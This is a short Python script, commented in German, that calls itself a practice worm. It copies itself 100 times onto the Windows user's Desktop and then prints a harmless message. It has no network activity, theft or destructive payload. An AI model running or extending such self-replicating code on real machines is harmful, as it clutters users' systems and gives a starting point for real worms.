import os
import shutil
import sys

# Pfad zur aktuellen Datei (Wurm selbst)
def get_self_path():
    return os.path.abspath(sys.argv[0])

# Funktion zur Verbreitung: Kopiert sich 100 Mal auf den Desktop (nur Hauptordner)
def spread(desktop_path):
    self_path = get_self_path()
    for i in range(1, 101):
        ziel_datei = os.path.join(desktop_path, f"wurm_kopie_{i}.py")
        try:
            shutil.copy2(self_path, ziel_datei)
            print(f"Kopiert nach: {ziel_datei}")
        except Exception as e:
            print(f"Fehler bei {ziel_datei}: {e}")

# Harmloses Payload
def payload():
    print("🚨 Test-Wurm aktiv – keine Gefahr. Nur zur Übung.")

# Hauptfunktion
def main():
    # Pfad zum Desktop des aktuellen Benutzers
    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")

    if not os.path.exists(desktop_path):
        print(f"Desktop nicht gefunden: {desktop_path}")
        return

    spread(desktop_path)
    payload()

if __name__ == "__main__":
    main()
